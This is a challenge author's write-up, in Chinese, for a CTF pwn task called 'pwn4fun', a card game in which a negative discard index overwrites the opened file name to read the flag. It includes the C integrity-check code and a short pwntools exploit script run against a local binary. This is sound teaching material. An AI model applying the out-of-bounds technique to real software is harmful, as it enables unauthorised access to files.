### [PWN]pwn4fun(solved 7) 

​	出题人其实一开始是想弄个破产版三国杀，然后搞几个角色，吕布不是有个技能叫无双吗，一张杀要打两张闪，然后想从这里先搞个double free，再开始操作。但当自己写的时候深深感觉到了代码实现能力的不足，就成了这个鬼样子（不过一开始的版本是有malloc跟free的）。所以，你题目描述里写到我可能应该要把这题放到misc里完全是实话，问卷调查里也有师傅反映这题不应该放在pwn分类下，所以你看，出题人还是挺老实的。

​	但不知道是什么原因，这道题的解居然还没tcache的heap题多，不知道是不是宣传不到位还是什么别的原因。漏洞点在当你需要连弃两张手牌的时候，第二次可以输入负数，能越界覆盖文件指针`fl4g`成`flag`，而存储attck卡片跟guard卡片刚好能提供a、g，所以可以利用sl大法，刷到1.attack 2.guard的开局，然后卖血丢牌即可。如果你操作得当并且运气够好还可以获得一个4字节的格式化字符串的机会（真的有赢过的师傅），但不会影响解题：）

​	程序在打开文件之前会对该字符串进行检验，在源代码里是这样写的：

```c
    int k = 233;
    f[0] *= k;
    while(k != 240)
    {
        if(f[0] % 2) 
        {
            f[0] = 3 * f[0] + 1;
            k = k * 6;
        }
        else 
        {
            f[0] /= 2;
            k = (k + 39) % 666;
        }
    }
    f[0] += 126;
    k = 233;
    f[2] *= k;
    while(k != 144)
    {
        if(f[2] % 2) 
        {
            f[2] = 3 * f[2] + 1;
            k = k * 6;
        }
        else 
        {
            f[2] /= 2;
            k = (k + 39) % 666;
        }
    }
    f[2] = (-45 * f[2] + 865)/13;
    k = 233;
    f[3] *= k;
    while(k != 240)
    {
        if(f[3] % 2) 
        {
            f[3] = 3 * f[3] + 1;
            k = k * 6;
        }
        else 
        {
            f[3] /= 2;
            k = (k + 39) % 666;
        }
    }
    f[3] += 102;
```

  	这其实不是原样返回输出的操作。如果熟悉3x+1的师傅应该能看出来这是一个防篡改的校验，对于每一个不同的字符都会生成一个特定的k路径，如果字符发生改变，会变成死循环或者最后的输出完全改变，一开始是想让`flgp`经过这个流程后变成`flag`，但是又担心太过脑洞，于是成了最后的`flag` ->`flag`，` f[2] = (-45 * f[2] + 865)/13`在`f[2]`为`4`或者`a`时刚好都等于自己本身。不过由于只是一个`char`，完全可以逐个爆破路径找到输出是`flag`的字符串。

​	因为是名字叫4fun，所以其实手打比脚本编写要简单，最后只需要再覆盖一次循环变量就能得到flag。

​	附上测试的exp：

```python
from pwn import *

def interact(p):
	while True:
		print "Input"
		tmp = raw_input()
		if "q" not in tmp:
			p.sendline(tmp)
			print("sendline %s") % (tmp)
			print p.recv(timeout=100)
		else:
			break

p = process("./s")
print p.recvuntil("start game\n")
print p.send("\n")
print p.recvuntil("(U)p?\n")
print p.sendline("I")
str = 'admin'+ '\x00'*4
print p.sendline(str)
print p.recvuntil("nothing\n")
print p.sendline("1")
print p.recvuntil("Pass\n")
interact(p)
print p.sendline(str)
p.interactive()

```



###   

### 	

